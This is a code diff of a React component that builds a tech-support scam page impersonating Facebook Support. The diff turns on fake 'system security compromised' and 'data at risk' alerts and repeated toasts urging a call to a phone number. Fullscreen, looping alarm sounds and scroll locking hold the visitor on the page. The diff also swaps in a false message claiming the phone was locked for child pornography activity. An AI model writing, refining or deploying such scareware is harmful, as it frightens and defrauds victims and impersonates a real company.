@@ -962,7 +962,6 @@
 
 
 /* eslint-disable react/prop-types */
-
 import { useState, useEffect, useRef, useCallback } from "react"
 import "../App.css"
 import { Button } from "@/components/ui/button"
@@ -977,56 +976,55 @@ const EmergencyCallRecursive = ({ depth = 0 }) => {
   const [isFullscreen, setIsFullscreen] = useState(false)
   const popupRef = useRef(null)
   const fullscreenRef = useRef(null)
-   const [isMobile, setIsMobile] = useState(false)
 
   const showEmergencyToasts = () => {
     toast.dismiss()
-    // toast.error("CRITICAL ERROR: System security compromised!", {
-    //   position: "top-right",
-    //   autoClose: false,
-    //   hideProgressBar: false,
-    //   closeOnClick: false,
-    //   pauseOnHover: true,
-    //   draggable: false,
-    //   progress: undefined,
-    //   className: "emergency-toast",
-    //   icon: <AlertCircle size={24} />
-    // })
+    toast.error("CRITICAL ERROR: System security compromised!", {
+      position: "top-right",
+      autoClose: false,
+      hideProgressBar: false,
+      closeOnClick: false,
+      pauseOnHover: true,
+      draggable: false,
+      progress: undefined,
+      className: "emergency-toast",
+      icon: <AlertCircle size={24} />
+    })
 
-    // toast.warning("WARNING: Your data may be at risk!", {
-    //   position: "top-left",
-    //   autoClose: false,
-    //   hideProgressBar: false,
-    //   closeOnClick: false,
-    //   pauseOnHover: false,
-    //   draggable: false,
-    //   progress: undefined,
-    //   className: "emergency-toast",
-    //   icon: <AlertCircle size={48} />
-    // })
+    toast.warning("WARNING: Your data may be at risk!", {
+      position: "top-left",
+      autoClose: false,
+      hideProgressBar: false,
+      closeOnClick: false,
+      pauseOnHover: false,
+      draggable: false,
+      progress: undefined,
+      className: "emergency-toast",
+      icon: <AlertCircle size={48} />
+    })
 
-    // toast.info("Call Facebook Support immediately:18445131621", {
-    //   position: "bottom-center",
-    //   autoClose: false,
-    //   hideProgressBar: false,
-    //   closeOnClick: false,
-    //   pauseOnHover: false,
-    //   draggable: false,
-    //   progress: undefined,
-    //   className: "emergency-toast-bottom",
-    //   icon: <PhoneCall size={48} />
-    // })
-    // toast.info("Call Facebook Support immediately:18445131621", {
-    //   position: "bottom-left",
-    //   autoClose: false,
-    //   hideProgressBar: false,
-    //   closeOnClick: false,
-    //   pauseOnHover: false,
-    //   draggable: false,
-    //   progress: undefined,
-    //   className: "emergency-toast-bottom",
-    //   icon: <PhoneCall size={48} />
-    // })
+    toast.info("Call Facebook Support immediately:18445131621", {
+      position: "bottom-center",
+      autoClose: false,
+      hideProgressBar: false,
+      closeOnClick: false,
+      pauseOnHover: false,
+      draggable: false,
+      progress: undefined,
+      className: "emergency-toast-bottom",
+      icon: <PhoneCall size={48} />
+    })
+    toast.info("Call Facebook Support immediately:18445131621", {
+      position: "bottom-left",
+      autoClose: false,
+      hideProgressBar: false,
+      closeOnClick: false,
+      pauseOnHover: false,
+      draggable: false,
+      progress: undefined,
+      className: "emergency-toast-bottom",
+      icon: <PhoneCall size={48} />
+    })
     toast.info("Call Facebook Support immediately:18445131621", {
       position: "bottom-right",
       autoClose: false,
@@ -1040,49 +1038,9 @@ const EmergencyCallRecursive = ({ depth = 0 }) => {
     })
   }
 
-
-    useEffect(() => {
-    const checkMobile = () => {
-      const userAgent = navigator.userAgent || navigator.vendor || window.opera
-      const isMobileDevice = /iPad|iPhone|iPod|Android|webOS|BlackBerry|IEMobile|Opera Mini/i.test(userAgent)
-      const isSmallScreen = window.innerWidth <= 768
-      setIsMobile(isMobileDevice || isSmallScreen)
-    }
-    
-    checkMobile()
-    window.addEventListener('resize', checkMobile)
-    
-    return () => window.removeEventListener('resize', checkMobile)
-  }, [])
-
-  // Set proper viewport for mobile
-  useEffect(() => {
-    let viewport = document.querySelector('meta[name="viewport"]')
-    if (!viewport) {
-      viewport = document.createElement('meta')
-      viewport.name = 'viewport'
-      document.head.appendChild(viewport)
-    }
-    viewport.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover'
-  }, [])
-
   const requestFullscreen = async () => {
     try {
       const elem = fullscreenRef.current || document.documentElement
-       if (isMobile) {
-        document.body.style.overflow = 'hidden'
-        document.documentElement.style.overflow = 'hidden'
-        document.body.style.position = 'fixed'
-        document.body.style.width = '100%'
-        document.body.style.height = '100%'
-        
-        // Hide iOS Safari UI bars
-        window.scrollTo(0, 1)
-        setTimeout(() => window.scrollTo(0, 0), 100)
-        
-        setIsFullscreen(true)
-        return
-      }
       if (elem.requestFullscreen) {
         await elem.requestFullscreen({ navigationUI: "hide" })
       } else if (elem.webkitRequestFullscreen) {
@@ -1095,16 +1053,11 @@ const EmergencyCallRecursive = ({ depth = 0 }) => {
       setIsFullscreen(true)
     } catch (err) {
       console.error("Fullscreen request failed:", err)
-        if (isMobile) {
-        document.body.style.overflow = 'hidden'
-        setIsFullscreen(true)
-      }
     }
   }
 
   useEffect(() => {
     const handleFullscreenChange = () => {
-       if (isMobile) return
       const isCurrentlyFullscreen = Boolean(
         document.fullscreenElement ||
         document.webkitFullscreenElement ||
@@ -1123,43 +1076,18 @@ const EmergencyCallRecursive = ({ depth = 0 }) => {
       }
     }
 
-       if (!isMobile) {
-      document.addEventListener('fullscreenchange', handleFullscreenChange)
-      document.addEventListener('webkitfullscreenchange', handleFullscreenChange)
-      document.addEventListener('mozfullscreenchange', handleFullscreenChange)
-      document.addEventListener('MSFullscreenChange', handleFullscreenChange)
-    }
+    document.addEventListener('fullscreenchange', handleFullscreenChange)
+    document.addEventListener('webkitfullscreenchange', handleFullscreenChange)
+    document.addEventListener('mozfullscreenchange', handleFullscreenChange)
+    document.addEventListener('MSFullscreenChange', handleFullscreenChange)
 
     return () => {
-      if (!isMobile) {
-        document.removeEventListener('fullscreenchange', handleFullscreenChange)
-        document.removeEventListener('webkitfullscreenchange', handleFullscreenChange)
-        document.removeEventListener('mozfullscreenchange', handleFullscreenChange)
-        document.removeEventListener('MSFullscreenChange', handleFullscreenChange)
-      }
+      document.removeEventListener('fullscreenchange', handleFullscreenChange)
+      document.removeEventListener('webkitfullscreenchange', handleFullscreenChange)
+      document.removeEventListener('mozfullscreenchange', handleFullscreenChange)
+      document.removeEventListener('MSFullscreenChange', handleFullscreenChange)
     }
-  }, [showPopup, isMobile])
-
-  //    if (!isMobile) {
-  //     document.addEventListener('fullscreenchange', handleFullscreenChange)
-  //     document.addEventListener('webkitfullscreenchange', handleFullscreenChange)
-  //     document.addEventListener('mozfullscreenchange', handleFullscreenChange)
-  //     document.addEventListener('MSFullscreenChange', handleFullscreenChange)
-  //   }
-
-  //   document.addEventListener('fullscreenchange', handleFullscreenChange)
-  //   document.addEventListener('webkitfullscreenchange', handleFullscreenChange)
-  //   document.addEventListener('mozfullscreenchange', handleFullscreenChange)
-  //   document.addEventListener('MSFullscreenChange', handleFullscreenChange)
-
-  //   return () => {
-      
-  //     document.removeEventListener('fullscreenchange', handleFullscreenChange)
-  //     document.removeEventListener('webkitfullscreenchange', handleFullscreenChange)
-  //     document.removeEventListener('mozfullscreenchange', handleFullscreenChange)
-  //     document.removeEventListener('MSFullscreenChange', handleFullscreenChange)
-  //   }
-  // }, [showPopup])
+  }, [showPopup])
 
   useEffect(() => {
     const savedState = localStorage.getItem("emergencyAlertActive")
@@ -1191,25 +1119,9 @@ const EmergencyCallRecursive = ({ depth = 0 }) => {
     }
   }, [showPopup])
 
-  // const activateEmergencyMode = () => {
-  //   setShowPopup(true)
-  //   document.body.style.overflow = "hidden"
-  //   playAlertSound()
-  //   startSoundInterval()
-  //   showEmergencyToasts()
-  //   requestFullscreen()
-  // }
-
-
-   const activateEmergencyMode = () => {
+  const activateEmergencyMode = () => {
     setShowPopup(true)
     document.body.style.overflow = "hidden"
-    document.documentElement.style.overflow = "hidden"
-    if (isMobile) {
-      document.body.style.position = 'fixed'
-      document.body.style.width = '100%'
-      document.body.style.height = '100%'
-    }
     playAlertSound()
     startSoundInterval()
     showEmergencyToasts()
@@ -1446,7 +1358,7 @@ const EmergencyCallRecursive = ({ depth = 0 }) => {
               <h2 className="text-2xl font-semibold text-center">Facebook Support</h2>
               <p className="text-base md:text-lg text-muted-foreground"><br></br>
            <h1 className="text-xl md:text-3xl font-semibold tracking-tight">Warning:</h1> <br></br>
-           We've Detected Unusual Login Activity on Your Facebook Account.
+           Your phone has been locked for a child pornography activity. Access has been restricted. Contact support Immediately at below number.
             <br /><br />
           </p>
               <p className="text-center text-gray-600 mb-4">Tap anywhere for immediate Facebook support</p>
